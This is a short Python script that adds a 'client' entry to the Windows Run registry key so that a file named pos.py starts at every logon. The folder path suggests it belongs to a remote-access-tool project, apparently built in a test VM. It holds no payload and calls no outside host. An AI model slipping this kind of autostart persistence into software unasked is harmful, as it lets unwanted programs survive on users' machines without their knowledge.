# Python code to add current script to the registry 
  
# module to edit the windows registry  
import winreg as reg  
import os              
  
def AddToRegistry(): 
  
    # in python __file__ is the instant of 
    # file path where it was executed  
    # so if it was executed from desktop, 
    # then __file__ will be  
    # c:\users\current_user\desktop 
    #pth = os.path.dirname(os.path.realpath(__file__))
      
    # name of the python file with extension 
    s_name="C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\pos.py"    
      
    # joins the file name to end of path address 
    address=os.path.join(s_name)  

    # key we want to change is HKEY_CURRENT_USER  
    # key value is Software\Microsoft\Windows\CurrentVersion\Run 
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
      
    # open the key to make changes to 
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
      
    # modifiy the opened key 
    reg.SetValueEx(open,"client",0,reg.REG_SZ,address) 
      
    # now close the opened key 
    reg.CloseKey(open) 

# Driver Code 
if __name__=="__main__": 
    AddToRegistry() 